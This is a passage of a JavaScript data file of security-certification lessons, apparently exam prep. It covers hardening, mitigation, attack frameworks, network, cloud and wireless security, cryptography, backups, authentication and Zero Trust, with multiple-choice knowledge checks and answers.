              explanation: "Configuration drift is when systems gradually deviate from their approved baseline configuration, often through undocumented changes."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Hardening = reduce attack surface through secure configuration",
            "Always change default credentials",
            "Use CIS Benchmarks or DISA STIGs as baselines",
            "Monitor for configuration drift"
          ],
          exam_essentials: [
            "CIS Benchmarks = industry hardening standard",
            "DISA STIGs = DoD hardening standard",
            "Configuration drift = deviation from baseline",
            "Disable SMBv1 (WannaCry vulnerability)"
          ]
        }
      },
      {
        id: 'D2-LESSON-010',
        domain: 2,
        title: 'Mitigation Techniques',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "When you can't eliminate a vulnerability, mitigation reduces its impact. Understanding mitigation techniques helps protect systems while awaiting permanent fixes.",
          learning_goals: [
            "Apply technical mitigation controls",
            "Implement network segmentation",
            "Use access controls effectively",
            "Design defense-in-depth mitigations"
          ]
        },
        sections: [
          {
            title: "Technical Mitigations",
            content: "**Network Segmentation:**\n- VLANs separate network traffic\n- Firewalls between segments\n- Microsegmentation for granular control\n- Limits lateral movement\n\n**Application Controls:**\n- Whitelisting (allow list)\n- Input validation\n- WAF (Web Application Firewall)\n- API gateways\n\n**Access Controls:**\n- Least privilege\n- Separation of duties\n- Just-in-time access\n- Privileged access management (PAM)\n\n**Endpoint Protection:**\n- EDR (Endpoint Detection & Response)\n- Application whitelisting\n- Host-based firewall\n- Patch management",
            key_points: [
              "Segmentation limits lateral movement",
              "Whitelisting > Blacklisting for security",
              "EDR provides detection and response capability",
              "PAM controls privileged access"
            ],
            knowledge_check: {
              question: "A critical server can't be patched due to application compatibility. What mitigation should be implemented FIRST?",
              options: [
                "Accept the risk and document it",
                "Network segmentation to isolate the server",
                "Replace the server with newer hardware",
                "Increase monitoring frequency"
              ],
              correct: 1,
              explanation: "Network segmentation isolates the vulnerable server, limiting potential damage if compromised. This is a key compensating control when patching isn't possible."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Segmentation limits lateral movement",
            "Whitelisting is stronger than blacklisting",
            "EDR provides detection + response",
            "PAM secures privileged accounts"
          ],
          exam_essentials: [
            "Segmentation = limits lateral movement",
            "Whitelisting = allow only approved",
            "EDR = Endpoint Detection and Response",
            "PAM = Privileged Access Management"
          ]
        }
      },
      {
        id: 'D2-LESSON-011',
        domain: 2,
        title: 'Attack Frameworks',
        difficulty: 'intermediate',
        duration: '45 min',
        introduction: {
          hook: "Attack frameworks provide common language for describing attacks and building defenses. MITRE ATT&CK and the Cyber Kill Chain help security teams understand attacker behavior.",
          learning_goals: [
            "Apply MITRE ATT&CK framework",
            "Use Cyber Kill Chain for defense planning",
            "Understand Diamond Model of intrusion analysis",
            "Map attacks to frameworks for analysis"
          ]
        },
        sections: [
          {
            title: "MITRE ATT&CK Deep Dive",
            content: "**Structure:**\n- Tactics: WHY (adversary goals)\n- Techniques: HOW (methods to achieve goals)\n- Procedures: Specific implementations\n\n**Key Tactics (Enterprise):**\n- Initial Access: How they get in\n- Execution: How they run code\n- Persistence: How they stay\n- Privilege Escalation: How they get higher access\n- Defense Evasion: How they avoid detection\n- Credential Access: How they get credentials\n- Discovery: How they learn the environment\n- Lateral Movement: How they spread\n- Collection: How they gather data\n- Exfiltration: How they steal data\n- Impact: Damage they cause\n\n**Using ATT&CK:**\n- Threat modeling\n- Detection engineering\n- Gap analysis\n- Red team planning",
            key_points: [
              "Tactics = goals (why); Techniques = methods (how)",
              "Enterprise matrix covers business environments",
              "Use for detection gap analysis",
              "Common language for threat discussion"
            ],
            knowledge_check: {
              question: "In MITRE ATT&CK, what is the relationship between Tactics and Techniques?",
              options: [
                "Tactics are specific; Techniques are general",
                "Tactics describe goals; Techniques describe methods",
                "Tactics are offensive; Techniques are defensive",
                "Tactics are for red teams; Techniques are for blue teams"
              ],
              correct: 1,
              explanation: "Tactics describe WHY (adversary goals like 'Persistence'), while Techniques describe HOW (methods to achieve that goal like 'Registry Run Keys')."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "MITRE ATT&CK: Tactics (goals) + Techniques (methods)",
            "Kill Chain: Sequential attack phases",
            "Diamond Model: Adversary, Capability, Infrastructure, Victim",
            "Use frameworks for detection gap analysis"
          ],
          exam_essentials: [
            "ATT&CK: Tactics = why; Techniques = how",
            "Kill Chain: Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions",
            "Diamond Model: 4 vertices of intrusion"
          ]
        }
      },
      {
        id: 'D2-LESSON-012',
        domain: 2,
        title: 'Security Assessments',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Security assessments validate controls and identify weaknesses before attackers do. Understanding different assessment types helps choose the right approach for your needs.",
          learning_goals: [
            "Differentiate between assessment types (vulnerability, penetration, red team)",
            "Understand assessment scoping and rules of engagement",
            "Interpret assessment findings and prioritize remediation",
            "Plan effective assessment programs"
          ]
        },
        sections: [
          {
            title: "Assessment Types",
            content: "**Vulnerability Assessment:**\n- Automated scanning\n- Identifies known vulnerabilities\n- Broad coverage\n- Doesn't validate exploitability\n\n**Penetration Testing:**\n- Actively exploits vulnerabilities\n- Validates real-world risk\n- Types: Black box (no info), White box (full info), Gray box (partial)\n- Rules of engagement critical\n\n**Red Team Assessment:**\n- Simulates real adversary\n- Full attack simulation\n- Tests people, process, technology\n- Often longer duration\n\n**Bug Bounty:**\n- Crowdsourced testing\n- Ongoing program\n- Pay per valid finding\n- Responsible disclosure",
            key_points: [
              "Vuln assessment = scanning; Pen test = exploitation",
              "Black box = no info; White box = full info",
              "Red team tests entire organization",
              "Rules of engagement define scope and limits"
            ],
            knowledge_check: {
              question: "A security firm is given network diagrams, credentials, and source code before testing. What type of penetration test is this?",
              options: [
                "Black box",
                "White box",
                "Gray box",
                "Red team"
              ],
              correct: 1,
              explanation: "White box testing provides full information to testers (diagrams, credentials, source code). Black box provides none; Gray box provides partial."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Vulnerability scan = identify; Pen test = validate exploitation",
            "Black/White/Gray box = information provided to testers",
            "Red team simulates real adversary behavior",
            "Rules of engagement define scope and boundaries"
          ],
          exam_essentials: [
            "Vulnerability scan ≠ penetration test",
            "Black box = no info; White box = full info",
            "Red team = adversary simulation (comprehensive)",
            "Bug bounty = crowdsourced, ongoing"
          ]
        }
      },
      // ═════════════════════════════════════════════════════════════
      // DOMAIN 3: Security Architecture
      // ═════════════════════════════════════════════════════════════
      {
        id: 'D3-LESSON-001', domain: 3, title: 'Security Architecture Concepts', difficulty: 'intermediate', duration: '50 min',
        introduction: { hook: "When engineers designed the Titanic, they created watertight compartments. But they didn't extend the bulkheads high enough—water spilled over. Security architecture builds containment, resilience, and defense in depth from the ground up.", learning_goals: ["Apply security architecture principles", "Design network architectures with segmentation", "Implement secure system design patterns"] },
        sections: [{ title: "Architecture Principles", content: "**Defense in Depth:**\n- Multiple overlapping controls\n- No single point of failure\n\n**Zero Trust:**\n- Never trust, always verify\n- Microsegmentation\n\n**Secure by Design:**\n- Security built in from the start\n- Not bolted on afterward\n\n**Segmentation:**\n- Divide networks into zones\n- Control traffic between zones\n- DMZ for public-facing services", key_points: ["Defense in depth = multiple layers", "Zero Trust = verify everything", "DMZ isolates public services"], knowledge_check: { question: "What is the PRIMARY purpose of a DMZ?", options: ["Store sensitive data", "Isolate public-facing services from internal network", "Provide backup network connectivity", "Enable remote access"], correct: 1, explanation: "DMZ isolates public-facing services (web servers, email) from the internal network, limiting damage if they're compromised." } }],
        summary: { key_takeaways: ["Defense in depth = multiple layers", "Zero Trust = verify everything", "DMZ isolates public services"], exam_essentials: ["DMZ = public-facing services zone", "Defense in depth = layered security", "Segmentation limits lateral movement"] }
      },
      {
        id: 'D3-LESSON-002', domain: 3, title: 'Infrastructure Security', difficulty: 'intermediate', duration: '55 min',
        introduction: { hook: "Infrastructure is the foundation—servers, endpoints, virtualization, embedded systems. Securing infrastructure requires hardening, EDR, and understanding virtualization risks.", learning_goals: ["Apply server hardening techniques", "Implement endpoint protection", "Secure virtualized environments"] },
        sections: [{ title: "Server and Endpoint Security", content: "**Server Hardening:**\n- Minimal installation\n- Disable unnecessary services\n- Security baselines (CIS, STIGs)\n- Disable SMBv1 (WannaCry)\n\n**Endpoint Protection:**\n- EDR (Endpoint Detection & Response)\n- Beyond traditional AV\n- Behavioral detection\n- Forensic capability\n\n**Virtualization Security:**\n- Type 1 (bare metal) more secure than Type 2\n- VM escape = breaking out of VM\n- Hypervisor hardening critical\n\n**Embedded/IoT:**\n- Often can't be patched\n- Network isolation essential\n- Firmware updates when available", key_points: ["EDR > traditional AV", "Type 1 hypervisor more secure", "VM escape = critical vulnerability", "IoT needs network isolation"], knowledge_check: { question: "Which is MORE secure—Type 1 or Type 2 hypervisor?", options: ["Type 2 (runs on host OS)", "Type 1 (bare metal)", "Both equal", "Depends on configuration"], correct: 1, explanation: "Type 1 runs directly on hardware (bare metal), with smaller attack surface than Type 2 which runs on a host OS." } }],
        summary: { key_takeaways: ["EDR provides detection + response beyond AV", "Type 1 hypervisor more secure", "IoT often needs network isolation"], exam_essentials: ["Type 1 = bare metal; Type 2 = hosted", "VM escape = break out of VM", "EDR = behavioral detection + forensics"] }
      },
      {
        id: 'D3-LESSON-003', domain: 3, title: 'Network Security', difficulty: 'intermediate', duration: '55 min',
        introduction: { hook: "Networks are the highways of enterprise IT. Network security controls traffic, detects threats, and enables secure connectivity.", learning_goals: ["Implement network security devices", "Apply secure protocols", "Design secure network architectures"] },
        sections: [{ title: "Network Security Devices", content: "**Firewalls:**\n- Packet filtering (Layer 3/4)\n- Stateful inspection (connection tracking)\n- NGFW (deep packet inspection, app awareness)\n- WAF (Web Application Firewall - Layer 7)\n\n**IDS/IPS:**\n- IDS: Detect and alert (passive)\n- IPS: Detect and block (inline)\n- Signature-based vs Anomaly-based\n\n**Network Access Control (NAC):**\n- 802.1X port-based authentication\n- Supplicant → Authenticator → RADIUS\n- Check device health before access\n\n**VPN:**\n- Site-to-site: IPsec (tunnel mode)\n- Remote access: SSL/TLS or IPsec\n- Split tunnel vs full tunnel", key_points: ["NGFW = firewall + IPS + app awareness", "IDS detects; IPS blocks", "802.1X = port-based NAC", "IPsec tunnel mode for site-to-site"], knowledge_check: { question: "What is the key difference between IDS and IPS?", options: ["IDS is signature-based; IPS is anomaly-based", "IDS detects and alerts; IPS detects and blocks", "IDS is network-based; IPS is host-based", "IDS is cheaper than IPS"], correct: 1, explanation: "IDS (Intrusion Detection System) detects and alerts but doesn't block. IPS (Intrusion Prevention System) detects AND blocks (inline deployment)." } }],
        summary: { key_takeaways: ["NGFW = firewall + IPS + application awareness", "IDS alerts; IPS blocks", "802.1X = port-based NAC with RADIUS"], exam_essentials: ["WAF = Layer 7 web protection", "IDS = detect/alert; IPS = detect/block", "802.1X: Supplicant → Authenticator → RADIUS"] }
      },
      {
        id: 'D3-LESSON-004', domain: 3, title: 'Wireless Security', difficulty: 'intermediate', duration: '50 min',
        introduction: { hook: "In 2007, hackers stole 45 million credit cards from TJX by exploiting weak WEP encryption. They sat in parking lots cracking the encryption in minutes.", learning_goals: ["Understand wireless security protocols", "Implement secure wireless configurations", "Defend against wireless attacks"] },
        sections: [{ title: "Wireless Protocols", content: "**Protocol Evolution:**\n- WEP: Broken, never use\n- WPA: Deprecated (TKIP)\n- WPA2: Current minimum (AES-CCMP)\n- WPA3: Latest, SAE authentication\n\n**Authentication Modes:**\n- Personal (PSK): Shared passphrase\n- Enterprise: 802.1X/RADIUS (individual auth)\n\n**WPA3 Improvements:**\n- SAE (Simultaneous Auth of Equals)\n- Resists offline dictionary attacks\n- Forward secrecy\n\n**Wireless Attacks:**\n- Evil twin: Fake AP with same SSID\n- Rogue AP: Unauthorized AP on network\n- Deauthentication attacks\n- Bluetooth: Bluesnarfing (data theft), Bluebugging (control)", key_points: ["WPA3 > WPA2 > WPA > WEP (never)", "Enterprise = 802.1X/RADIUS", "Evil twin = fake AP mimicking real", "SAE resists offline attacks"], knowledge_check: { question: "What wireless attack creates a fake access point with the same SSID as a legitimate network?", options: ["Rogue AP", "Evil twin", "Deauthentication", "WPS attack"], correct: 1, explanation: "Evil twin creates a fake AP with the same SSID, tricking users into connecting to the attacker's network for MitM attacks." } }],
        summary: { key_takeaways: ["WPA3 preferred; WPA2-AES minimum; WEP never", "Enterprise mode uses 802.1X/RADIUS", "Evil twin = fake AP with same SSID"], exam_essentials: ["WPA3 SAE resists offline attacks", "Evil twin = fake AP; Rogue AP = unauthorized AP", "Bluesnarfing = Bluetooth data theft"] }
      },
      {
        id: 'D3-LESSON-005', domain: 3, title: 'Cloud Security', difficulty: 'intermediate', duration: '55 min',
        introduction: { hook: "Capital One's breach exposed 100 million customers through a misconfigured WAF. The breach didn't exploit AWS—it exploited how Capital One configured their cloud. Shared responsibility model is critical.", learning_goals: ["Understand cloud service models and security implications", "Apply shared responsibility model", "Implement cloud-specific security controls"] },
        sections: [{ title: "Cloud Models and Responsibility", content: "**Service Models:**\n- IaaS: You manage OS and up (EC2)\n- PaaS: You manage apps and data (Elastic Beanstalk)\n- SaaS: You manage data and access (Microsoft 365)\n\n**Deployment Models:**\n- Public: Shared, multi-tenant\n- Private: Dedicated, single organization\n- Hybrid: Mix of both\n- Community: Shared by similar organizations\n\n**Shared Responsibility:**\n- Provider: Security OF the cloud (physical, hypervisor)\n- Customer: Security IN the cloud (config, data, access)\n- More responsibility as you go from SaaS → IaaS\n\n**Cloud Security Controls:**\n- CASB: Cloud Access Security Broker\n- CSPM: Cloud Security Posture Management\n- CWPP: Cloud Workload Protection Platform", key_points: ["IaaS = most customer responsibility", "SaaS = least customer responsibility", "Misconfigurations are #1 cloud risk", "CASB enforces security policies"], knowledge_check: { question: "In the shared responsibility model for IaaS, who is responsible for OS patching?", options: ["Cloud provider", "Customer", "Shared equally", "Depends on the provider"], correct: 1, explanation: "In IaaS, the customer manages the OS and everything above it, including patching. Provider manages hardware and hypervisor." } }],
        summary: { key_takeaways: ["IaaS = most customer responsibility; SaaS = least", "Misconfigurations are leading cloud breach cause", "CASB, CSPM, CWPP for cloud security"], exam_essentials: ["IaaS: customer manages OS+", "SaaS: provider manages most", "CASB = Cloud Access Security Broker"] }
      },
      {
        id: 'D3-LESSON-006', domain: 3, title: 'Cryptography', difficulty: 'intermediate', duration: '60 min',
        introduction: { hook: "Strong encryption meant that even with access to data, the NSA couldn't read properly encrypted content. Cryptography is the foundation of digital trust.", learning_goals: ["Apply symmetric and asymmetric encryption", "Implement hashing for integrity", "Understand digital signatures and PKI"] },
        sections: [{ title: "Cryptographic Applications", content: "**Key Management:**\n- Key generation: Use secure random\n- Key storage: HSM (Hardware Security Module)\n- Key rotation: Change keys periodically\n- Key escrow: Backup with trusted party\n\n**Certificates:**\n- X.509 standard format\n- DV/OV/EV validation levels\n- Certificate chain to root CA\n- Revocation: CRL, OCSP\n\n**TLS (Transport Layer Security):**\n- TLS 1.3 preferred\n- TLS 1.2 acceptable\n- TLS 1.0/1.1 deprecated\n- Perfect forward secrecy important", key_points: ["HSM for secure key storage", "TLS 1.3 > 1.2 > never 1.0/1.1", "OCSP/CRL for revocation checking", "Forward secrecy protects past sessions"], knowledge_check: { question: "Where should cryptographic keys be stored for maximum security?", options: ["Encrypted file on server", "Database with encryption", "Hardware Security Module (HSM)", "Cloud key management"], correct: 2, explanation: "HSMs provide the highest security for key storage—keys never leave the tamper-resistant hardware module." } }],
        summary: { key_takeaways: ["HSM for key storage", "TLS 1.3 preferred; 1.0/1.1 deprecated", "Forward secrecy protects past sessions"], exam_essentials: ["HSM = hardware key storage", "TLS 1.3 > TLS 1.2", "OCSP/CRL = certificate revocation"] }
      },
      {
        id: 'D3-LESSON-007', domain: 3, title: 'Resilience & Recovery', difficulty: 'intermediate', duration: '55 min',
        introduction: { hook: "A fire at OVH's data center destroyed millions of websites. Some customers lost data permanently because backups were in the same facility. True resilience requires tested recovery capabilities.", learning_goals: ["Design high availability architectures", "Implement backup strategies", "Develop disaster recovery plans"] },
        sections: [{ title: "Backup and Recovery", content: "**Backup Types:**\n- Full: Complete copy\n- Incremental: Changes since last backup (any type)\n- Differential: Changes since last FULL backup\n\n**3-2-1 Rule:**\n- 3 copies of data\n- 2 different media types\n- 1 offsite location\n\n**Recovery Objectives:**\n- RPO (Recovery Point Objective): Maximum data loss (time)\n- RTO (Recovery Time Objective): Maximum downtime\n\n**Site Types:**\n- Hot site: Fully operational, immediate failover\n- Warm site: Hardware ready, needs data\n- Cold site: Space only, days to activate\n\n**High Availability:**\n- Redundant components\n- Load balancing\n- Clustering\n- Failover mechanisms", key_points: ["Incremental = since last backup; Differential = since last FULL", "3-2-1 rule for backups", "RPO = data loss; RTO = downtime", "Hot site = immediate; Cold site = days"], knowledge_check: { question: "What is the difference between RPO and RTO?", options: ["RPO is cost; RTO is time", "RPO is data loss time; RTO is downtime", "RPO is objective; RTO is actual", "RPO is recovery; RTO is testing"], correct: 1, explanation: "RPO (Recovery Point Objective) is maximum acceptable data loss (measured in time since last backup). RTO (Recovery Time Objective) is maximum acceptable downtime." } }],
        summary: { key_takeaways: ["3-2-1 backup rule essential", "RPO = data loss; RTO = downtime", "Hot/Warm/Cold sites for DR"], exam_essentials: ["Incremental = since last backup; Differential = since last FULL", "Hot = immediate; Warm = hours; Cold = days", "RAID 1 = mirror; RAID 5 = parity"] }
      },
      {
        id: 'D3-LESSON-008', domain: 3, title: 'Data Protection', difficulty: 'intermediate', duration: '50 min',
        introduction: { hook: "A misconfigured S3 bucket exposed 198 million voter records. Data protection isn't just about stopping attackers—it's knowing where data is and ensuring it's protected everywhere.", learning_goals: ["Implement data classification", "Protect data at rest, in transit, in use", "Deploy Data Loss Prevention (DLP)"] },
        sections: [{ title: "Data States and Protection", content: "**Data States:**\n- At rest: Stored (encrypt with AES)\n- In transit: Moving (TLS/IPsec)\n- In use: Being processed (access controls)\n\n**Data Classification:**\n- Government: Top Secret > Secret > Confidential > Unclassified\n- Corporate: Restricted > Confidential > Internal > Public\n\n**DLP (Data Loss Prevention):**\n- Network DLP: Monitor traffic\n- Endpoint DLP: Agent on devices\n- Cloud DLP: CASB integration\n- Prevents unauthorized data disclosure\n\n**Secure Destruction:**\n- Crypto erasure: Destroy encryption keys\n- Degaussing: Magnetic media only\n- Physical destruction: Shredding, incineration", key_points: ["Three states: rest, transit, use", "DLP prevents data disclosure", "Crypto erasure = destroy keys", "Degaussing only works on magnetic media"], knowledge_check: { question: "Which destruction method is ONLY effective on magnetic media?", options: ["Crypto erasure", "Degaussing", "Physical shredding", "Secure overwrite"], correct: 1, explanation: "Degaussing uses magnetic fields to destroy data—only works on magnetic media (HDDs, tapes), NOT SSDs or flash storage." } }],
        summary: { key_takeaways: ["Protect data in all three states", "DLP prevents unauthorized disclosure", "Degaussing only for magnetic media"], exam_essentials: ["At rest = AES; In transit = TLS", "DLP types: Network, Endpoint, Cloud", "Crypto erasure = destroy encryption keys"] }
      },
      {
        id: 'D1-LESSON-003',
        domain: 1,
        title: 'Authentication Methods',
        difficulty: 'beginner',
        duration: '50 min',
        introduction: {
          hook: "The Colonial Pipeline ransomware attack that disrupted fuel supplies across the Eastern United States in 2021 started with a single compromised password on a VPN account that didn't use multi-factor authentication. One weak authentication control led to $4.4 million in ransom payments.",
          learning_goals: [
            "Identify the five authentication factors (knowledge, possession, inherence, location, behavior)",
            "Design multi-factor authentication using factors from different categories",
            "Compare authentication technologies including biometrics and tokens",
            "Recognize common authentication attacks and countermeasures"
          ]
        },
        sections: [
          {
            title: "The Five Authentication Factors",
            content: "**Something You Know (Knowledge)**\nPasswords, PINs, security questions. Most common but weakest alone.\n\n**Something You Have (Possession)**\nSmart cards, hardware tokens, mobile phones, security keys.\n\n**Something You Are (Inherence/Biometrics)**\nFingerprints, facial recognition, iris scan, voice recognition.\n\n**Somewhere You Are (Location)**\nGPS location, IP address geolocation, network location.\n\n**Something You Do (Behavior)**\nTyping patterns, gait analysis, mouse movements.",
            key_points: [
              "Five factors: Know, Have, Are, Where, Do",
              "MFA requires factors from DIFFERENT categories",
              "Two passwords is NOT MFA (same category)",
              "Biometrics cannot be changed if compromised"
            ],
            knowledge_check: {
              question: "A system requires a password and a PIN. Is this multi-factor authentication?",
              options: [
                "Yes, because two different credentials are required",
                "Yes, because passwords and PINs are different",
                "No, because both are 'something you know'",
                "No, because PINs are not secure enough"
              ],
              correct: 2,
              explanation: "This is NOT MFA. Both password and PIN are 'something you know.' MFA requires factors from DIFFERENT categories."
            }
          },
          {
            title: "Biometric Considerations",
            content: "**Error Rates:**\n- FAR (False Acceptance Rate): Unauthorized user accepted (Type II error) - SECURITY concern\n- FRR (False Rejection Rate): Authorized user rejected (Type I error) - USABILITY concern\n- CER/EER (Crossover Error Rate): Where FAR = FRR; lower is better\n\n**Biometric Types:**\n- Fingerprint: Common, moderate accuracy\n- Facial recognition: Convenient, affected by lighting\n- Iris scan: Very accurate, expensive\n- Retina scan: Most accurate, invasive\n- Voice: Convenient, affected by illness",
            key_points: [
              "FAR = security concern (letting wrong people in)",
              "FRR = usability concern (blocking right people)",
              "CER/EER compares biometric systems (lower = better)",
              "Biometrics can't be changed if compromised"
            ],
            knowledge_check: {
              question: "A biometric system incorrectly grants access to an unauthorized person. What type of error is this?",
              options: [
                "False Rejection Rate (FRR)",
                "False Acceptance Rate (FAR)",
                "Crossover Error Rate (CER)",
                "Type I error"
              ],
              correct: 1,
              explanation: "False Acceptance Rate (FAR) - the system falsely accepted an unauthorized user. This is a Type II error and a security concern."
            }
          },
          {
            title: "Authentication Technologies",
            content: "**TOTP (Time-based One-Time Password)**\nGenerates codes based on current time. Changes every 30 seconds. Apps: Google Authenticator, Authy.\n\n**HOTP (HMAC-based One-Time Password)**\nGenerates codes based on counter. Doesn't expire until used.\n\n**FIDO2/WebAuthn**\nPhishing-resistant authentication using security keys. Binds credentials to specific websites. Cannot be phished.\n\n**Smart Cards/PIV**\nCertificate-based authentication. Common in government (CAC/PIV cards).\n\n**Push Notifications**\nApprove login from mobile app. Convenient but vulnerable to push fatigue attacks.",
            key_points: [
              "TOTP = time-based (30 sec); HOTP = counter-based",
              "FIDO2/WebAuthn is phishing-resistant",
              "Smart cards use certificates",
              "Push notifications vulnerable to fatigue attacks"
            ],
            exam_tips: [
              "FIDO2 provides strongest phishing resistance",
              "SMS MFA is vulnerable to SIM swapping",
              "TOTP is more secure than SMS but not phishing-resistant"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Five factors: Knowledge, Possession, Inherence, Location, Behavior",
            "MFA requires factors from DIFFERENT categories",
            "FAR = security (wrong person in); FRR = usability (right person out)",
            "FIDO2/WebAuthn provides phishing resistance"
          ],
          exam_essentials: [
            "Two passwords ≠ MFA (same category)",
            "FAR = Type II = security; FRR = Type I = usability",
            "TOTP = time-based; HOTP = counter-based",
            "FIDO2 = phishing-resistant"
          ]
        }
      },
      {
        id: 'D1-LESSON-004',
        domain: 1,
        title: 'Cryptographic Fundamentals',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "When you send a message through WhatsApp, enter your credit card online, or connect to your company's VPN, cryptography is working behind the scenes. In 2017, researchers discovered a flaw in RSA key generation affecting millions of devices. Understanding cryptographic principles is essential for recognizing when systems are secure.",
          learning_goals: [
            "Distinguish between symmetric and asymmetric encryption",
            "Explain how hash functions provide integrity verification",
            "Describe digital signatures for authentication and non-repudiation",
            "Understand PKI components and certificate management"
          ]
        },
        sections: [
          {
            title: "Symmetric Encryption",
            content: "Uses the SAME key for encryption and decryption.\n\n**Characteristics:**\n- Fast and efficient for bulk data\n- Key distribution challenge (how to share key securely?)\n- Scales poorly (need unique key per pair)\n\n**Current Standards:**\n- AES (Advanced Encryption Standard): Current standard, 128/192/256-bit keys\n- AES-GCM: Provides encryption + integrity\n\n**Deprecated (Never Use):**\n- DES: 56-bit key, easily broken\n- 3DES: Slow, being phased out\n- RC4: Stream cipher, broken",
            key_points: [
              "Same key encrypts and decrypts",
              "Fast for bulk data encryption",
              "AES-256 is current standard",
              "Key distribution is the challenge"
            ],
            knowledge_check: {
              question: "Which is the PRIMARY challenge with symmetric encryption?",
              options: [
                "It's too slow for practical use",
                "Securely distributing the shared key",
                "The encryption isn't strong enough",
                "It requires too much processing power"
              ],
              correct: 1,
              explanation: "Key distribution is the main challenge. Both parties need the same key, but how do you securely share it? Asymmetric encryption helps solve this."
            }
          },
          {
            title: "Asymmetric Encryption",
            content: "Uses a KEY PAIR: public key and private key.\n\n**How It Works:**\n- Encrypt with PUBLIC key → Only PRIVATE key can decrypt\n- Sign with PRIVATE key → Anyone can verify with PUBLIC key\n\n**Algorithms:**\n- RSA: Most common, key exchange and signatures\n- ECC (Elliptic Curve): Smaller keys, same security (256 ECC ≈ 3072 RSA)\n- Diffie-Hellman: Key exchange only, not encryption\n\n**Hybrid Encryption:**\nUse asymmetric to exchange symmetric key, then symmetric for data. Best of both worlds!",
            key_points: [
              "Public key encrypts; Private key decrypts",
              "Private key signs; Public key verifies",
              "Slower than symmetric, used for key exchange",
              "Hybrid: asymmetric for key exchange, symmetric for data"
            ],
            exam_tips: [
              "Encrypt with recipient's PUBLIC key",
              "Sign with your PRIVATE key",
              "ECC = smaller keys, equivalent security",
              "DH = key exchange only, not encryption"
            ],
            knowledge_check: {
              question: "To send an encrypted message to Alice, which key do you use?",
              options: [
                "Your private key",
                "Your public key",
                "Alice's private key",
                "Alice's public key"
              ],
              correct: 3,
              explanation: "Encrypt with recipient's PUBLIC key. Only Alice's private key can decrypt it. This ensures only Alice can read the message."
            }
          },
          {
            title: "Hashing and Digital Signatures",
            content: "**Hash Functions:**\nOne-way function creating fixed-size 'fingerprint'. Any change = completely different hash.\n\n- SHA-256, SHA-3: Current standards\n- MD5, SHA-1: Deprecated, don't use for security\n\n**Password Hashing:**\nUse SLOW hashes: bcrypt, PBKDF2, Argon2. Add unique SALT per password.\n\n**Digital Signatures:**\n1. Hash the message\n2. Encrypt hash with sender's PRIVATE key\n3. Recipient decrypts with sender's PUBLIC key\n4. Compare hashes\n\nProvides: Integrity + Authentication + Non-repudiation",
            key_points: [
              "Hashing is one-way (can't reverse)",
              "SHA-256 current standard; MD5/SHA-1 deprecated",
              "Passwords: slow hash + unique salt",
              "Digital signature = hash encrypted with private key"
            ],
            knowledge_check: {
              question: "What does a digital signature provide that encryption alone doesn't?",
              options: [
                "Confidentiality",
                "Non-repudiation",
                "Faster processing",
                "Larger key sizes"
              ],
              correct: 1,
              explanation: "Digital signatures provide non-repudiation—cryptographic proof the sender signed it. They also provide integrity and authentication, not just confidentiality."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Symmetric: same key, fast, key distribution challenge",
            "Asymmetric: key pair, slower, solves key distribution",
            "AES-256 = symmetric standard; RSA/ECC = asymmetric",
            "Digital signatures: integrity + authentication + non-repudiation"
          ],
          exam_essentials: [
            "AES = symmetric; RSA/ECC = asymmetric",
            "Encrypt with PUBLIC; Sign with PRIVATE",
            "MD5/SHA-1 = deprecated; SHA-256/SHA-3 = current",
            "Passwords: bcrypt/Argon2 with salt"
          ]
        }
      },
      {
        id: 'D1-LESSON-005',
        domain: 1,
        title: 'Zero Trust Architecture',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Traditional security assumed everything inside the network was trusted. Zero Trust says 'never trust, always verify'—every access request is verified regardless of location. After breaches showed attackers move laterally once inside, Zero Trust became essential.",
          learning_goals: [
            "Understand Zero Trust principles and implementation",
            "Implement identity-centric security controls",
            "Apply microsegmentation and least privilege",
            "Design continuous verification mechanisms"
          ]
        },
        sections: [
          {
            title: "Zero Trust Principles",
            content: "**Core Principle: Never Trust, Always Verify**\n\nNo implicit trust based on:\n- Network location (inside/outside)\n- Device ownership\n- Previous authentication\n\n**Key Tenets:**\n1. Verify explicitly (authenticate every request)\n2. Least privilege access (minimum necessary)\n3. Assume breach (limit blast radius)\n\n**Control Plane vs Data Plane:**\n- Control plane: Makes access decisions\n- Data plane: Enforces access decisions",
            key_points: [
              "Never trust, always verify",
              "Network location doesn't grant trust",
              "Every request must be authenticated",
              "Assume breach and limit impact"
            ],
            knowledge_check: {
              question: "In Zero Trust, which factor grants implicit trust?",
              options: [
                "Being on the corporate network",
                "Using a company-owned device",
                "Previous successful authentication",
                "None—all access must be verified explicitly"
              ],
              correct: 3,
              explanation: "Zero Trust grants NO implicit trust. Every access request must be verified regardless of network location, device, or previous authentication."
            }
          },
          {
            title: "Identity and Access in Zero Trust",
            content: "**Identity as the New Perimeter:**\nIdentity verification is the foundation of Zero Trust.\n\n**Requirements:**\n- Strong authentication (MFA mandatory)\n- Phishing-resistant MFA preferred (FIDO2)\n- Continuous authentication/verification\n- Context-aware access (device, location, behavior)\n\n**Device Trust:**\n- Verify device health and compliance\n- MDM/EDR integration\n- Tiered access based on device trust level",
            key_points: [
              "Identity replaces network as trust boundary",
              "MFA is mandatory, FIDO2 preferred",
              "Continuous verification, not one-time",
              "Device trust affects access level"
            ]
          },
          {
            title: "Microsegmentation",
            content: "**Definition:**\nCreate security boundaries around individual workloads, not just networks.\n\n**Benefits:**\n- Limits lateral movement\n- Contains breaches to single segment\n- Application-level isolation\n\n**Implementation:**\n- Software-defined perimeters\n- Identity-aware proxies\n- Application-level firewalls\n- Network segmentation + identity verification",
            key_points: [
              "Microsegmentation isolates individual workloads",
              "Limits lateral movement after breach",
              "Goes beyond traditional network segmentation",
              "Each workload has its own security boundary"
            ],
            knowledge_check: {
              question: "What is the PRIMARY benefit of microsegmentation?",
              options: [
                "Faster network performance",
                "Reduced hardware costs",
                "Limited lateral movement after breach",
                "Simplified network management"
              ],
              correct: 2,
              explanation: "Microsegmentation's primary benefit is limiting lateral movement. If attackers breach one segment, they can't easily move to others."
            }
          }
        ],
